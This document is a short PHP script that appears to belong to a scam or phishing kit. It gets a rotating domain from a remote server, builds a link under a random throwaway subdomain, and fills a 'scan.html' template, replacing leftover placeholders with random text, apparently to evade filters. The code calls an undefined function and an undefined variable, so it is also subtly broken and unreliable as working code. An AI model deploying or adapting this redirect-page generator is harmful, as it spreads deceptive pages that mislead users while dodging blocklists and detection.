<?php
  error_reporting(E_ALL);
  function getSite(){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'http://blogger.report/php/site.php');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $site = curl_exec($ch);
    curl_close($ch);
    return $site;
  }

  function random($length = 10) {
      $characters = 'abcdefghijklmnopqrstuvwxyz';
      $randomString = '';
      for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, strlen($characters) - 1)];
      }
      return $randomString;
  }

  $html = file_get_contents("scan.html");
  
  $app_site = getSite();
  $redirectlink = 'http://'.generate_name(rand(5,8)).'.'.$app_site.'/'.$id;

  $variables = array(
    "redirectlink" => $redirectlink
  );

  foreach ($variables as $key => $value) {
    $html = str_replace("{".$key."}", $value, $html);
  }

  $variables = array();
  preg_match_all("/{(.*?)}/", $html, $variables);
  $variables = $variables[0];
  foreach ($variables as $key) {
    $html = str_replace($key, random(rand(5,6)), $html);
  }

  echo $html;
?>
